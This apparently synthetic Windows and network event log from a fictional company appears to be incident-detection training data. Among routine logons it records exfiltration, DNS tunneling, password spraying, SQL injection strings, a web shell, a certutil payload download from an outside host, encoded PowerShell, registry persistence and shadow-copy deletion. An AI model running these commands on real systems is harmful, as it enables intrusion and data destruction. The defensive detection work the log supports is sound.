+EVT-00173,2026-11-02 10:32:19,FS-SRV01,PROXY_ACCESS,CORP\lcastro,10.20.1.20,198.51.100.130:443,Proxy,HTTPS POST outbound,bytes_out=27367731 uri=/upload/chunk/6,Allowed,Warning
+EVT-00174,2026-11-02 10:32:22,FS-SRV01,5140,CORP\cmolina,10.20.4.108,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00175,2026-11-02 10:32:38,FS-SRV01,PROXY_ACCESS,CORP\lcastro,10.20.1.20,198.51.100.130:443,Proxy,HTTPS POST outbound,bytes_out=27238925 uri=/upload/chunk/7,Allowed,Warning
+EVT-00176,2026-11-02 10:32:57,FS-SRV01,PROXY_ACCESS,CORP\lcastro,10.20.1.20,198.51.100.130:443,Proxy,HTTPS POST outbound,bytes_out=29845830 uri=/upload/chunk/8,Allowed,Warning
+EVT-00177,2026-11-02 10:39:52,WS-111,PROXY_ACCESS,CORP\fsuarez,10.20.4.111,203.0.113.141:443,Proxy,HTTPS GET outbound,bytes_out=8474 uri=/qlhmpe,Allowed,Informational
+EVT-00178,2026-11-02 10:40:52,WS-111,dns_query,fsuarez,10.20.4.111,10.20.1.10,DNS,A query www.office365.com,,Success,Informational
+EVT-00179,2026-11-02 10:44:57,DB-SRV02,7036,SYSTEM,10.20.1.20,,System,Service entered running state,,Success,Informational
+EVT-00180,2026-11-02 10:45:35,FS-SRV01,5140,CORP\dsosa,10.20.4.105,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Marketing,,Success,Informational
+EVT-00181,2026-11-02 10:48:19,FS-SRV01,4634,CORP\dsosa,10.20.4.105,,Security,An account was logged off,,Success,Informational
+EVT-00182,2026-11-02 10:48:31,DC-01,4624,CORP\nibarra,10.20.3.110,APP-SRV02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00183,2026-11-02 10:50:49,WS-108,dns_query,cmolina,10.20.4.108,10.20.1.10,DNS,A query www.windowsupdate.com,,Success,Informational
+EVT-00184,2026-11-02 10:51:45,WS-108,4688,CORP\cmolina,10.20.4.108,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00185,2026-11-02 10:53:03,WS-108,4688,CORP\cmolina,10.20.4.108,,Security,A new process has been created,winword.exe,Success,Informational
+EVT-00186,2026-11-02 10:54:30,DB-SRV02,7036,SYSTEM,10.20.1.10,,System,Service entered running state,,Success,Informational
+EVT-00187,2026-11-02 10:55:00,DC-01,4672,CORP\admin.it,10.20.1.5,DC-01,Security,Special privileges assigned to new logon,,Success,Informational
+EVT-00188,2026-11-02 10:59:20,FS-SRV01,5140,CORP\pmendez,10.20.3.104,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00189,2026-11-02 11:10:14,WS-108,4688,CORP\cmolina,10.20.4.108,,Security,A new process has been created,explorer.exe,Success,Informational
+EVT-00190,2026-11-02 11:12:32,APP-SRV02,4634,CORP\jrivas,10.20.5.103,,Security,An account was logged off,,Success,Informational
+EVT-00191,2026-11-02 11:13:10,WS-109,4688,CORP\mflores,10.20.4.109,,Security,A new process has been created,teams.exe,Success,Informational
+EVT-00192,2026-11-02 11:13:15,WEB-02,HTTP_ACCESS,-,10.20.3.107,WEB-02:443,IIS,HTTP request,/api/orders?page=2,200,Informational
+EVT-00193,2026-11-02 11:13:21,WEB-02,HTTP_ACCESS,-,10.20.4.111,WEB-02:443,IIS,HTTP request,/,200,Informational
+EVT-00194,2026-11-02 11:17:44,FS-SRV01,5140,CORP\pmendez,10.20.3.104,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00195,2026-11-02 11:17:48,DB-SRV02,7036,SYSTEM,10.20.1.30,,System,Service entered running state,,Success,Informational
+EVT-00196,2026-11-02 11:20:52,FS-SRV01,4634,CORP\lcastro,10.20.3.101,,Security,An account was logged off,,Success,Informational
+EVT-00197,2026-11-02 11:22:49,LNX-APP01,ssh_login,deploy,10.20.5.10,10.20.5.15,Auth,Accepted publickey for deploy,,success,Informational
+EVT-00198,2026-11-02 11:23:31,DB-SRV02,4634,CORP\pmendez,10.20.3.104,,Security,An account was logged off,,Success,Informational
+EVT-00199,2026-11-02 11:23:33,WS-109,4688,CORP\tparedes,10.20.5.109,,Security,A new process has been created,outlook.exe,Success,Informational
+EVT-00200,2026-11-02 11:26:49,MAIL-GW01,EMAIL_DELIVERED,jrivas@corp.example,203.0.113.30,MAIL-GW01,Mail,Email delivered with attachment presupuesto.xlsx,,Success,Informational
+EVT-00201,2026-11-02 11:27:00,APP-SRV02,4624,CORP\fsuarez,10.20.4.111,WEB-02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00202,2026-11-02 11:28:22,WEB-02,HTTP_ACCESS,-,10.20.5.109,WEB-02:443,IIS,HTTP request,/api/products,404,Informational
+EVT-00203,2026-11-02 11:29:30,DB-SRV02,4624,CORP\dsosa,10.20.4.105,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00204,2026-11-02 11:29:35,APP-SRV02,4624,CORP\pmendez,10.20.3.104,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00205,2026-11-02 11:30:27,MAIL-GW01,EMAIL_DELIVERED,pmendez@corp.example,203.0.113.30,MAIL-GW01,Mail,Email delivered with attachment presupuesto.xlsx,,Success,Informational
+EVT-00206,2026-11-02 11:33:42,DB-SRV02,4624,CORP\fsuarez,10.20.4.111,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00207,2026-11-02 11:35:52,DB-SRV02,4634,CORP\tparedes,10.20.5.109,,Security,An account was logged off,,Success,Informational
+EVT-00208,2026-11-02 11:39:09,WS-107,dns_query,rvega,10.20.3.107,10.20.1.10,DNS,A query www.google.com,,Success,Informational
+EVT-00209,2026-11-02 11:40:14,WS-104,dns_query,pmendez,10.20.3.104,10.20.1.10,DNS,A query www.google.com,,Success,Informational
+EVT-00210,2026-11-02 11:40:34,WS-103,4688,CORP\jrivas,10.20.5.103,,Security,A new process has been created,outlook.exe,Success,Informational
+EVT-00211,2026-11-02 11:41:25,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query omg3ld2wdx3vu51cea9sk6kj8ux2jws5.2nzz01g1es.cdn-sync-update.net,,Success,Informational
+EVT-00212,2026-11-02 11:41:49,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query m189h61ilc0viaxqrz0mvt6mp6vvpdnx.fpa2o2wgid.cdn-sync-update.net,,Success,Informational
+EVT-00213,2026-11-02 11:42:14,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query 3y0aj7jmhcyfzfp53ajcttmnw1lm5cfo.4j2knfrn08.cdn-sync-update.net,,Success,Informational
+EVT-00214,2026-11-02 11:42:32,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query komy19ou91v36tevbbsnof7p261x285i.0jvpygbzs8.cdn-sync-update.net,,Success,Informational
+EVT-00215,2026-11-02 11:42:57,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query 2kws8ntoflhalukn6ou8794yagbv16il.fz3k7l8i2d.cdn-sync-update.net,,Success,Informational
+EVT-00216,2026-11-02 11:43:18,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query hz24nqf7bzj6147448oo0u41nxm7xpj0.yim2cbssrj.cdn-sync-update.net,,Success,Informational
+EVT-00217,2026-11-02 11:43:32,WEB-02,4634,CORP\agomez,10.20.5.106,,Security,An account was logged off,,Success,Informational
+EVT-00218,2026-11-02 11:43:42,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query 4ln4hd2ty94fy4rq8aim1z1rb3ep1laz.ih01zzffxz.cdn-sync-update.net,,Success,Informational
+EVT-00219,2026-11-02 11:44:03,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query ac6j7rxhx5b3s3j8l54d81ig1cknx5p3.h5otesgc80.cdn-sync-update.net,,Success,Informational
+EVT-00220,2026-11-02 11:44:19,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query g6xxqzj86eldv869tasi5mu4g4cbs472.we7tsyeg2s.cdn-sync-update.net,,Success,Informational
+EVT-00221,2026-11-02 11:44:32,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query koje5bowhj366zw1bzyky13esqjbpw2v.lfpkwsein3.cdn-sync-update.net,,Success,Informational
+EVT-00222,2026-11-02 11:44:49,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query t1rxq2utc5g0c0795i1as95ukpg1a2m8.7bmxdj198q.cdn-sync-update.net,,Success,Informational
+EVT-00223,2026-11-02 11:45:13,WEB-02,4624,CORP\tparedes,10.20.5.109,WEB-02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00224,2026-11-02 11:45:15,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query yajxq89g7y19tomowm6fk0p2a9ln5yq6.swf73864kw.cdn-sync-update.net,,Success,Informational
+EVT-00225,2026-11-02 11:45:34,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query 10iuhcn647bpjhwahv0fde8ovlczjxec.9rixfx1r7r.cdn-sync-update.net,,Success,Informational
+EVT-00226,2026-11-02 11:45:47,WS-117,dns_query,tparedes,10.20.5.117,10.20.1.10,DNS,TXT query e7xbckqmio7urdg1oox1ouvzerufpm0t.dom04qzwxn.cdn-sync-update.net,,Success,Informational
+EVT-00227,2026-11-02 11:45:59,WS-104,4688,CORP\pmendez,10.20.3.104,,Security,A new process has been created,outlook.exe,Success,Informational
+EVT-00228,2026-11-02 11:46:27,WEB-02,7036,SYSTEM,10.20.1.30,,System,Service entered running state,,Success,Informational
+EVT-00229,2026-11-02 11:47:01,DB-SRV02,4624,CORP\agomez,10.20.5.106,WEB-02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00230,2026-11-02 11:47:44,APP-SRV02,4634,CORP\dsosa,10.20.4.105,,Security,An account was logged off,,Success,Informational
+EVT-00231,2026-11-02 11:53:15,WS-101,4688,CORP\lcastro,10.20.3.101,,Security,A new process has been created,outlook.exe,Success,Informational
+EVT-00232,2026-11-02 12:00:31,DB-SRV02,4624,CORP\mflores,10.20.4.109,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00233,2026-11-02 12:00:45,FS-SRV01,4634,CORP\bacosta,10.20.5.112,,Security,An account was logged off,,Success,Informational
+EVT-00234,2026-11-02 12:07:41,DC-01,4634,CORP\pmendez,10.20.3.104,,Security,An account was logged off,,Success,Informational
+EVT-00235,2026-11-02 12:07:52,FS-SRV01,5140,CORP\fsuarez,10.20.4.111,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00236,2026-11-02 12:11:59,DC-01,4634,CORP\agomez,10.20.5.106,,Security,An account was logged off,,Success,Informational
+EVT-00237,2026-11-02 12:12:48,DB-SRV02,4634,CORP\agomez,10.20.5.106,,Security,An account was logged off,,Success,Informational
+EVT-00238,2026-11-02 12:16:54,WEB-02,HTTP_ACCESS,-,10.20.4.105,WEB-02:443,IIS,HTTP request,/,304,Informational
+EVT-00239,2026-11-02 12:20:50,WEB-02,4624,CORP\cmolina,10.20.4.108,DB-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00240,2026-11-02 12:21:23,DC-01,4634,CORP\mflores,10.20.4.109,,Security,An account was logged off,,Success,Informational
+EVT-00241,2026-11-02 12:22:11,APP-SRV02,4634,CORP\mflores,10.20.4.109,,Security,An account was logged off,,Success,Informational
+EVT-00242,2026-11-02 12:23:28,APP-SRV02,4634,CORP\dsosa,10.20.4.105,,Security,An account was logged off,,Success,Informational
+EVT-00243,2026-11-02 12:24:50,WS-109,PROXY_ACCESS,CORP\tparedes,10.20.5.109,203.0.113.141:443,Proxy,HTTPS GET outbound,bytes_out=6458 uri=/5az4vv,Allowed,Informational
+EVT-00244,2026-11-02 12:25:11,WEB-02,HTTP_ACCESS,-,10.20.5.109,WEB-02:443,IIS,HTTP request,/index.html,200,Informational
+EVT-00245,2026-11-02 12:26:07,FS-SRV01,4624,CORP\nibarra,10.20.3.110,DB-SRV02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00246,2026-11-02 12:26:54,DB-SRV02,4624,CORP\cmolina,10.20.4.108,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00247,2026-11-02 12:27:11,FS-SRV01,5140,CORP\nibarra,10.20.3.110,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Marketing,,Success,Informational
+EVT-00248,2026-11-02 12:30:10,DC-01,4625,CORP\lcastro,10.20.9.9,DC-01,Security,An account failed to log on (scanner),,Failure,Informational
+EVT-00249,2026-11-02 12:30:16,DC-01,4625,CORP\agomez,10.20.5.106,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00250,2026-11-02 12:30:21,DC-01,4625,CORP\mflores,10.20.9.9,DC-01,Security,An account failed to log on (scanner),,Failure,Informational
+EVT-00251,2026-11-02 12:30:31,DC-01,4625,CORP\jrivas,10.20.9.9,DC-01,Security,An account failed to log on (scanner),,Failure,Informational
+EVT-00252,2026-11-02 12:30:40,DC-01,4625,CORP\pmendez,10.20.9.9,DC-01,Security,An account failed to log on (scanner),,Failure,Informational
+EVT-00253,2026-11-02 12:30:48,DC-01,4625,CORP\dsosa,10.20.9.9,DC-01,Security,An account failed to log on (scanner),,Failure,Informational
+EVT-00254,2026-11-02 12:30:57,DC-01,4625,CORP\agomez,10.20.9.9,DC-01,Security,An account failed to log on (scanner),,Failure,Informational
+EVT-00255,2026-11-02 12:31:08,DC-01,4625,CORP\rvega,10.20.9.9,DC-01,Security,An account failed to log on (scanner),,Failure,Informational
+EVT-00256,2026-11-02 12:31:17,DC-01,4625,CORP\cmolina,10.20.9.9,DC-01,Security,An account failed to log on (scanner),,Failure,Informational
+EVT-00257,2026-11-02 12:35:04,FS-SRV01,5140,CORP\dsosa,10.20.4.105,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00258,2026-11-02 12:35:43,FS-SRV01,5140,CORP\bacosta,10.20.5.112,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Marketing,,Success,Informational
+EVT-00259,2026-11-02 12:36:46,DC-01,4634,CORP\rvega,10.20.3.107,,Security,An account was logged off,,Success,Informational
+EVT-00260,2026-11-02 12:37:56,FS-SRV01,5140,CORP\fsuarez,10.20.4.111,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00261,2026-11-02 12:40:58,APP-SRV02,4624,CORP\fsuarez,10.20.4.111,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00262,2026-11-02 12:41:09,WS-109,4688,CORP\mflores,10.20.4.109,,Security,A new process has been created,excel.exe,Success,Informational
+EVT-00263,2026-11-02 12:45:00,FS-SRV01,4624,CORP\fsuarez,10.20.4.111,WEB-02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00264,2026-11-02 12:45:17,MAIL-GW01,EMAIL_DELIVERED,jrivas@corp.example,203.0.113.30,MAIL-GW01,Mail,Email delivered with attachment reporte.pdf,,Success,Informational
+EVT-00265,2026-11-02 12:48:07,DB-SRV02,4624,CORP\rvega,10.20.3.107,DC-01,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00266,2026-11-02 12:48:50,DC-01,4625,CORP\lcastro,10.20.3.101,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00267,2026-11-02 12:49:31,FS-SRV01,4624,CORP\tparedes,10.20.5.109,FS-SRV01,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00268,2026-11-02 12:51:34,DB-SRV02,4624,CORP\tparedes,10.20.5.109,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00269,2026-11-02 12:53:07,APP-SRV02,4624,CORP\bacosta,10.20.5.112,WEB-02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00270,2026-11-02 12:55:14,FS-SRV01,5140,CORP\rvega,10.20.3.107,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00271,2026-11-02 12:57:19,APP-SRV02,4634,CORP\pmendez,10.20.3.104,,Security,An account was logged off,,Success,Informational
+EVT-00272,2026-11-02 12:58:33,DC-01,4624,CORP\cmolina,10.20.4.108,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00273,2026-11-02 13:06:10,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/admin,500,Informational
+EVT-00274,2026-11-02 13:06:17,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/.git/config,404,Informational
+EVT-00275,2026-11-02 13:06:24,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/wp-login.php,404,Informational
+EVT-00276,2026-11-02 13:06:31,FS-SRV01,4624,CORP\mflores,10.20.4.109,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00277,2026-11-02 13:06:37,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/phpmyadmin/,404,Informational
+EVT-00278,2026-11-02 13:06:45,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/backup.zip,404,Informational
+EVT-00279,2026-11-02 13:06:53,DC-01,4625,CORP\pmendez,10.20.3.104,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00280,2026-11-02 13:06:54,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/api/v1/users?id=1' OR '1'='1,404,Informational
+EVT-00281,2026-11-02 13:07:02,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/login?user=admin' --,500,Informational
+EVT-00282,2026-11-02 13:07:13,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/upload.aspx,200,Warning
+EVT-00283,2026-11-02 13:07:25,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/uploads/img0412.aspx?cmd=whoami,200,Warning
+EVT-00284,2026-11-02 13:07:34,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/uploads/img0412.aspx?cmd=ipconfig,200,Warning
+EVT-00285,2026-11-02 13:07:45,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/uploads/img0412.aspx?cmd=whoami,200,Warning
+EVT-00286,2026-11-02 13:07:55,WEB-02,HTTP_ACCESS,-,192.0.2.147,WEB-02:443,IIS,HTTP request,/uploads/img0412.aspx?cmd=certutil,200,Warning
+EVT-00287,2026-11-02 13:08:01,WEB-02,4688,IIS APPPOOL\DefaultAppPool,192.0.2.147,,Security,A new process has been created,cmd.exe /c whoami,Success,Warning
+EVT-00288,2026-11-02 13:08:13,WEB-02,4688,IIS APPPOOL\DefaultAppPool,192.0.2.147,,Security,A new process has been created,cmd.exe /c certutil -urlcache -f http://203.0.113.200/svc.exe C:\Windows\Temp\svc.exe,Success,Warning
+EVT-00289,2026-11-02 13:08:38,WEB-02,5156,IIS APPPOOL\DefaultAppPool,10.20.2.40,203.0.113.200:80,Firewall,Allowed outbound connection to 203.0.113.200:80 (process=certutil.exe),certutil.exe,Success,Warning
+EVT-00290,2026-11-02 13:12:07,WS-110,dns_query,nibarra,10.20.3.110,10.20.1.10,DNS,A query www.microsoft.com,,Success,Informational
+EVT-00291,2026-11-02 13:12:53,FS-SRV01,4624,CORP\tparedes,10.20.5.109,DC-01,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00292,2026-11-02 13:14:09,WEB-02,4634,CORP\jrivas,10.20.5.103,,Security,An account was logged off,,Success,Informational
+EVT-00293,2026-11-02 13:15:53,FS-SRV01,5140,CORP\pmendez,10.20.3.104,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Public,,Success,Informational
+EVT-00294,2026-11-02 13:16:39,DC-01,4625,CORP\dsosa,10.20.4.105,DC-01,Security,An account failed to log on,,Failure,Informational
+EVT-00295,2026-11-02 13:17:36,WEB-02,HTTP_ACCESS,-,10.20.4.111,WEB-02:443,IIS,HTTP request,/api/products,200,Informational
+EVT-00296,2026-11-02 13:17:49,WS-109,dns_query,tparedes,10.20.5.109,10.20.1.10,DNS,A query www.google.com,,Success,Informational
+EVT-00297,2026-11-02 13:18:46,WS-101,4688,CORP\lcastro,10.20.3.101,,Security,A new process has been created,onedrive.exe,Success,Informational
+EVT-00298,2026-11-02 13:19:26,DC-01,4624,CORP\agomez,10.20.5.106,APP-SRV02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00299,2026-11-02 13:20:30,WS-104,4688,CORP\pmendez,10.20.3.104,,Security,A new process has been created,explorer.exe,Success,Informational
+EVT-00300,2026-11-02 13:22:23,WS-107,4688,CORP\rvega,10.20.3.107,,Security,A new process has been created,winword.exe,Success,Informational
+EVT-00301,2026-11-02 13:23:47,FS-SRV01,5140,CORP\rvega,10.20.3.107,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Marketing,,Success,Informational
+EVT-00302,2026-11-02 13:25:23,DB-SRV02,4624,CORP\lcastro,10.20.3.101,WEB-02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00303,2026-11-02 13:25:46,WS-107,4688,CORP\rvega,10.20.3.107,,Security,A new process has been created,onedrive.exe,Success,Informational
+EVT-00304,2026-11-02 13:26:03,DB-SRV02,4624,CORP\agomez,10.20.5.106,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00305,2026-11-02 13:26:05,FS-SRV01,5140,CORP\jrivas,10.20.5.103,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Marketing,,Success,Informational
+EVT-00306,2026-11-02 13:28:53,FS-SRV01,5140,CORP\nibarra,10.20.3.110,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00307,2026-11-02 13:31:13,WS-108,PROXY_ACCESS,CORP\cmolina,10.20.4.108,203.0.113.141:443,Proxy,HTTPS GET outbound,bytes_out=6750 uri=/kidxiu,Allowed,Informational
+EVT-00308,2026-11-02 13:35:27,APP-SRV02,4634,CORP\nibarra,10.20.3.110,,Security,An account was logged off,,Success,Informational
+EVT-00309,2026-11-02 13:38:01,WEB-02,4624,CORP\pmendez,10.20.3.104,WEB-02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00310,2026-11-02 13:40:41,DB-SRV02,4634,CORP\tparedes,10.20.5.109,,Security,An account was logged off,,Success,Informational
+EVT-00311,2026-11-02 13:43:38,APP-SRV02,4624,CORP\cmolina,10.20.4.108,WEB-02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00312,2026-11-02 13:44:33,APP-SRV02,4624,CORP\bacosta,10.20.5.112,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00313,2026-11-02 13:45:59,DB-SRV02,4624,CORP\bacosta,10.20.5.112,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00314,2026-11-02 13:48:12,WEB-02,HTTP_ACCESS,-,10.20.5.103,WEB-02:443,IIS,HTTP request,/api/products,200,Informational
+EVT-00315,2026-11-02 13:50:29,WS-107,4688,CORP\rvega,10.20.3.107,,Security,A new process has been created,explorer.exe,Success,Informational
+EVT-00316,2026-11-02 13:52:09,WS-109,PROXY_ACCESS,CORP\mflores,10.20.4.109,192.0.2.50:443,Proxy,HTTPS GET outbound,bytes_out=4581 uri=/e92dna,Allowed,Informational
+EVT-00317,2026-11-02 13:53:16,WEB-02,4634,CORP\agomez,10.20.5.106,,Security,An account was logged off,,Success,Informational
+EVT-00318,2026-11-02 14:00:12,FS-SRV01,5140,CORP\fsuarez,10.20.4.111,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00319,2026-11-02 14:03:32,APP-SRV02,4634,CORP\lcastro,10.20.3.101,,Security,An account was logged off,,Success,Informational
+EVT-00320,2026-11-02 14:05:00,WS-108,PROXY_ACCESS,CORP\agomez,10.20.5.106,203.0.113.141:443,Proxy,HTTPS POST outbound,bytes_out=9140000 uri=/drive/upload/1,Allowed,Informational
+EVT-00321,2026-11-02 14:06:38,LNX-APP01,ssh_login,deploy,10.20.5.10,10.20.5.15,Auth,Accepted publickey for deploy,,success,Informational
+EVT-00322,2026-11-02 14:09:46,DB-SRV02,4624,CORP\cmolina,10.20.4.108,FS-SRV01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00323,2026-11-02 14:09:49,WS-108,dns_query,cmolina,10.20.4.108,10.20.1.10,DNS,A query www.windowsupdate.com,,Success,Informational
+EVT-00324,2026-11-02 14:11:57,DB-SRV02,4634,CORP\bacosta,10.20.5.112,,Security,An account was logged off,,Success,Informational
+EVT-00325,2026-11-02 14:12:38,FS-SRV01,4634,CORP\fsuarez,10.20.4.111,,Security,An account was logged off,,Success,Informational
+EVT-00326,2026-11-02 14:13:44,WS-107,dns_query,rvega,10.20.3.107,10.20.1.10,DNS,A query www.zoom.us,,Success,Informational
+EVT-00327,2026-11-02 14:14:09,APP-SRV02,4624,CORP\rvega,10.20.3.107,DC-01,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00328,2026-11-02 14:15:49,FS-SRV01,4634,CORP\mflores,10.20.4.109,,Security,An account was logged off,,Success,Informational
+EVT-00329,2026-11-02 14:17:48,WS-109,dns_query,mflores,10.20.4.109,10.20.1.10,DNS,A query www.microsoft.com,,Success,Informational
+EVT-00330,2026-11-02 14:18:59,WS-109,PROXY_ACCESS,CORP\tparedes,10.20.5.109,203.0.113.141:443,Proxy,HTTPS GET outbound,bytes_out=8952 uri=/1z7p3o,Allowed,Informational
+EVT-00331,2026-11-02 14:21:41,WS-111,dns_query,fsuarez,10.20.4.111,10.20.1.10,DNS,A query www.slack.com,,Success,Informational
+EVT-00332,2026-11-02 14:22:00,MAIL-GW01,EMAIL_DELIVERED,mflores@corp.example,198.51.100.88,MAIL-GW01,Mail,Email delivered with attachment Factura_Noviembre.pdf.exe from facturacion@proveedor-pagos.example,,Success,Informational
+EVT-00333,2026-11-02 14:24:13,DC-01,4624,CORP\mflores,10.20.4.109,APP-SRV02,Security,An account was successfully logged on (LogonType=3),,Success,Informational
+EVT-00334,2026-11-02 14:26:29,FS-SRV01,5140,CORP\jrivas,10.20.5.103,FS-SRV01,Security,Network share accessed: \\FS-SRV01\Shared,,Success,Informational
+EVT-00335,2026-11-02 14:28:00,WS-109,PROCESS_EXEC,mflores,10.20.4.109,,EDR,Process executed: Factura_Noviembre.pdf.exe (parent=OUTLOOK.EXE),Factura_Noviembre.pdf.exe,Success,Informational
+EVT-00336,2026-11-02 14:28:35,WS-109,4688,CORP\mflores,10.20.4.109,,Security,A new process has been created,powershell.exe -NoProfile -EncodedCommand [REDACTED_SYNTHETIC],Success,High
+EVT-00337,2026-11-02 14:29:35,WS-109,5156,CORP\mflores,10.20.4.109,198.51.100.221:8443,Firewall,Outbound connection to known C2 198.51.100.221:8443 (beacon),Factura_Noviembre.pdf.exe,Success,Warning
+EVT-00338,2026-11-02 14:30:12,FS-SRV01,7036,SYSTEM,10.20.1.20,,System,Service entered running state,,Success,Informational
+EVT-00339,2026-11-02 14:30:40,WS-109,5156,CORP\mflores,10.20.4.109,198.51.100.221:8443,Firewall,Outbound connection to known C2 198.51.100.221:8443 (beacon),Factura_Noviembre.pdf.exe,Success,Warning
+EVT-00340,2026-11-02 14:31:37,WS-109,5156,CORP\mflores,10.20.4.109,198.51.100.221:8443,Firewall,Outbound connection to known C2 198.51.100.221:8443 (beacon),Factura_Noviembre.pdf.exe,Success,Warning
+EVT-00341,2026-11-02 14:31:53,FS-SRV01,4624,CORP\dsosa,10.20.4.105,DB-SRV02,Security,An account was successfully logged on (LogonType=2),,Success,Informational
+EVT-00342,2026-11-02 14:32:34,LNX-APP01,ssh_login,deploy,10.20.5.10,10.20.5.15,Auth,Accepted publickey for deploy,,success,Informational
+EVT-00343,2026-11-02 14:32:36,WS-109,5156,CORP\mflores,10.20.4.109,198.51.100.221:8443,Firewall,Outbound connection to known C2 198.51.100.221:8443 (beacon),Factura_Noviembre.pdf.exe,Success,Warning
+EVT-00344,2026-11-02 14:32:41,WEB-02,HTTP_ACCESS,-,10.20.3.110,WEB-02:443,IIS,HTTP request,/api/orders?page=2,200,Informational
+EVT-00345,2026-11-02 14:33:39,WS-109,5156,CORP\mflores,10.20.4.109,198.51.100.221:8443,Firewall,Outbound connection to known C2 198.51.100.221:8443 (beacon),Factura_Noviembre.pdf.exe,Success,Warning
+EVT-00346,2026-11-02 14:34:40,WS-109,5156,CORP\mflores,10.20.4.109,198.51.100.221:8443,Firewall,Outbound connection to known C2 198.51.100.221:8443 (beacon),Factura_Noviembre.pdf.exe,Success,Warning
+EVT-00347,2026-11-02 14:37:40,WS-109,4688,CORP\mflores,10.20.4.109,,Security,A new process has been created,reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\Public\upd.exe,Success,Medium
+EVT-00348,2026-11-02 14:39:40,WS-109,4688,CORP\mflores,10.20.4.109,,Security,A new process has been created,vssadmin.exe delete shadows /all /quiet,Success,Warning
